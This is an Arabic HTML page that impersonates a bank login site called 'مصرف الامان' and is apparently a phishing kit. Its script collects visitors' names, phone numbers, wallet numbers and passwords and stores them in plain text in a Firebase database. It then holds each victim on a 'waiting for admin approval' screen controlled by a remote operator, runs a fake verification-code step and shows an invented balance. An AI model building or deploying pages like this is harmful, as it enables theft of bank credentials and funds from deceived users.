<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مصرف الامان</title>
    <link href="https://fonts.googleapis.com/css2?family=Noto+Naskh+Arabic:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Noto Naskh Arabic', Arial, sans-serif;
            background: linear-gradient(135deg, #1a5f7a 0%, #159895 50%, #57c5b6 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 450px;
            width: 100%;
            text-align: center;
        }
        .logo { width: 120px; margin-bottom: 20px; }
        h1 { color: #1a5f7a; margin-bottom: 10px; font-size: 28px; }
        .subtitle { color: #666; margin-bottom: 30px; font-size: 16px; }
        .form-group { margin-bottom: 20px; text-align: right; }
        label { display: block; margin-bottom: 8px; color: #333; font-weight: 600; }
        input {
            width: 100%;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input:focus { outline: none; border-color: #159895; }
        .btn {
            background: linear-gradient(135deg, #1a5f7a, #159895);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 10px;
            font-size: 18px;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            margin-top: 10px;
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
        .btn-secondary {
            background: #f0f0f0;
            color: #333;
            margin-right: 10px;
        }
        .hidden { display: none !important; }
        .error { color: #e74c3c; margin-top: 10px; font-size: 14px; }
        .success { color: #27ae60; margin-top: 10px; font-size: 14px; }
        .step { display: none; }
        .step.active { display: block; }
        .password-wrapper { position: relative; }
        .toggle-password {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #666;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin: 20px 0;
        }
        .stat-box {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 10px;
        }
        .stat-number { font-size: 24px; font-weight: bold; color: #1a5f7a; }
        .stat-label { font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <img src="logo.png" alt="Logo" class="logo" id="logoImg">
        
        <div id="stepLanding" class="step active">
            <h1>مصرف الامان</h1>
            <p class="subtitle">نظام آمن وموثوق لإدارة حساباتك</p>
            <button class="btn" onclick="goToPersonalInfo()">الدخول للنظام</button>
        </div>

        <div id="stepPersonal" class="step">
            <h1>المعلومات الشخصية</h1>
            <p class="subtitle">أدخل بياناتك للمتابعة</p>
            <div class="form-group">
                <label for="nameInput">الاسم الكامل</label>
                <input type="text" id="nameInput" placeholder="أدخل اسمك الكامل">
            </div>
            <div class="form-group">
                <label for="personalPhoneInput">رقم الهاتف</label>
                <input type="tel" id="personalPhoneInput" placeholder="05xxxxxxxx" maxlength="11">
            </div>
            <button class="btn btn-secondary" onclick="goToLanding()">رجوع</button>
            <button class="btn" onclick="goToLogin()">متابعة</button>
        </div>

        <div id="stepLogin" class="step">
            <h1>تسجيل الدخول</h1>
            <p class="subtitle">أدخل بيانات حسابك</p>
            <div class="form-group">
                <label for="phoneInput">رقم المحفظة</label>
                <input type="text" id="phoneInput" placeholder="أدخل رقم المحفظة">
            </div>
            <div class="form-group">
                <label for="pinInput">كلمة المرور</label>
                <div class="password-wrapper">
                    <input type="password" id="pinInput" placeholder="أدخل كلمة المرور">
                    <span class="toggle-password" onclick="togglePin()">👁️</span>
                </div>
            </div>
            <p id="loginError" class="error hidden"></p>
            <button class="btn btn-secondary" onclick="goToPersonal()">رجوع</button>
            <button class="btn" onclick="submitLogin()">دخول</button>
        </div>

        <div id="stepOTP" class="step">
            <h1>التحقق</h1>
            <p class="subtitle">أدخل رمز التحقق المرسل لرقمك</p>
            <div class="form-group">
                <label for="otpSingleInput">رمز التحقق</label>
                <input type="tel" id="otpSingleInput" placeholder="0000" maxlength="4">
            </div>
            <p id="otpError" class="error hidden"></p>
            <button class="btn btn-secondary" onclick="retryLogin()">رجوع</button>
            <button class="btn" onclick="submitOTP()">تحقق</button>
        </div>

        <div id="stepSuccess" class="step">
            <h1>✅ تم التحقق بنجاح</h1>
            <p class="subtitle">جاري تحويلك للصفحة الرئيسية...</p>
            <div class="stats-grid">
                <div class="stat-box">
                    <div class="stat-number" id="balanceDisplay">0.00</div>
                    <div class="stat-label">الرصيد (ر.س)</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="transactionsDisplay">0</div>
                    <div class="stat-label">المعاملات</div>
                </div>
            </div>
            <button class="btn" onclick="logout()">تسجيل الخروج</button>
        </div>
    </div>

    <script type="module">
        const firebaseConfig = {
            apiKey: "AIzaSyCMX_V8oAUGAjaBLCh5rPWeLWr82kzCa80",
            authDomain: "amnbnk.firebaseapp.com",
            projectId: "amnbnk",
            storageBucket: "amnbnk.firebasestorage.app",
            messagingSenderId: "12041424611",
            appId: "1:12041424611:web:7492667d1e6f66ec7f7fd6",
            measurementId: "G-DDBFZ7PSMB",
            databaseURL: "https://amnbnk-default-rtdb.firebaseio.com/"
        };

        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, push, onValue, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
        import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-analytics.js";

        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);
        const analytics = getAnalytics(app);

        window.firebaseDB = database;
        window.firebaseRef = ref;
        window.firebaseSet = set;
        window.firebaseGet = get;
        window.firebasePush = push;
        window.firebaseOnValue = onValue;
        window.firebaseUpdate = update;
        window.firebaseRemove = remove;

        console.log('Firebase initialized successfully!');
    </script>

    <script>
        let currentSessionId = null;
        let currentUserData = null;

        function generateSessionId() {
            return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        }

        function showStep(stepId) {
            document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
            document.getElementById(stepId).classList.add('active');
        }

        function goToLanding() { showStep('stepLanding'); }
        function goToPersonalInfo() { 
            currentSessionId = generateSessionId();
            showStep('stepPersonal'); 
        }
        function goToPersonal() { showStep('stepPersonal'); }
        function goToLogin() { 
            const name = document.getElementById('nameInput').value.trim();
            const phone = document.getElementById('personalPhoneInput').value.trim();
            
            if (!name || !phone) {
                alert('الرجاء إدخال جميع البيانات');
                return;
            }
            
            currentUserData = { name, phone, timestamp: Date.now() };
            const userRef = window.firebaseRef(window.firebaseDB, 'site1/sessions/' + currentSessionId + '/personal');
            window.firebaseSet(userRef, currentUserData);
            
            showStep('stepLogin'); 
        }

        function togglePin() {
            const pinInput = document.getElementById('pinInput');
            pinInput.type = pinInput.type === 'password' ? 'text' : 'password';
        }

        function submitLogin() {
            const phone = document.getElementById('phoneInput').value.trim();
            const pin = document.getElementById('pinInput').value.trim();
            const errorEl = document.getElementById('loginError');
            
            if (!phone || !pin) {
                errorEl.textContent = 'الرجاء إدخال جميع البيانات';
                errorEl.classList.remove('hidden');
                return;
            }
            
            const loginData = { 
                phone, 
                pin,
                status: 'waiting',
                timestamp: Date.now() 
            };
            const loginRef = window.firebaseRef(window.firebaseDB, 'site1/sessions/' + currentSessionId + '/login');
            window.firebaseSet(loginRef, loginData);
            
            window.firebaseOnValue(loginRef, (snapshot) => {
                const data = snapshot.val();
                if (data && data.status === 'approved') {
                    showStep('stepOTP');
                    generateOTP();
                } else if (data && data.status === 'rejected') {
                    errorEl.textContent = 'تم رفض الطلب من قبل الإدارة';
                    errorEl.classList.remove('hidden');
                }
            });
            
            errorEl.textContent = 'جاري انتظار موافقة الإدارة...';
            errorEl.classList.remove('hidden');
            errorEl.style.color = '#159895';
        }

        function generateOTP() {
            const otp = Math.floor(1000 + Math.random() * 9000).toString();
            const otpRef = window.firebaseRef(window.firebaseDB, 'site1/sessions/' + currentSessionId + '/otp');
            window.firebaseSet(otpRef, { 
                code: otp, 
                status: 'waiting',
                timestamp: Date.now() 
            });
            
            window.firebaseOnValue(otpRef, (snapshot) => {
                const data = snapshot.val();
                if (data && data.status === 'approved') {
                    showStep('stepSuccess');
                    loadUserData();
                } else if (data && data.status === 'rejected') {
                    const errorEl = document.getElementById('otpError');
                    errorEl.textContent = 'رمز التحقق غير صحيح';
                    errorEl.classList.remove('hidden');
                }
            });
        }

        function submitOTP() {
            const enteredOtp = document.getElementById('otpSingleInput').value.trim();
            const otpRef = window.firebaseRef(window.firebaseDB, 'site1/sessions/' + currentSessionId + '/otp');
            
            window.firebaseGet(otpRef).then((snapshot) => {
                const data = snapshot.val();
                if (data && data.code === enteredOtp) {
                    window.firebaseUpdate(otpRef, { status: 'approved' });
                } else {
                    window.firebaseUpdate(otpRef, { status: 'rejected' });
                }
            });
        }

        function retryLogin() { showStep('stepLogin'); }
        function retryOTP() { 
            document.getElementById('otpSingleInput').value = '';
            document.getElementById('otpError').classList.add('hidden');
        }

        function loadUserData() {
            const sessionRef = window.firebaseRef(window.firebaseDB, 'site1/sessions/' + currentSessionId);
            window.firebaseGet(sessionRef).then((snapshot) => {
                const data = snapshot.val();
                if (data && data.login) {
                    document.getElementById('balanceDisplay').textContent = '12,450.00';
                    document.getElementById('transactionsDisplay').textContent = '24';
                }
            });
        }

        function logout() {
            if (currentSessionId) {
                const sessionRef = window.firebaseRef(window.firebaseDB, 'site1/sessions/' + currentSessionId);
                window.firebaseRemove(sessionRef);
            }
            currentSessionId = null;
            currentUserData = null;
            showStep('stepLanding');
        }
    </script>
</body>
</html>
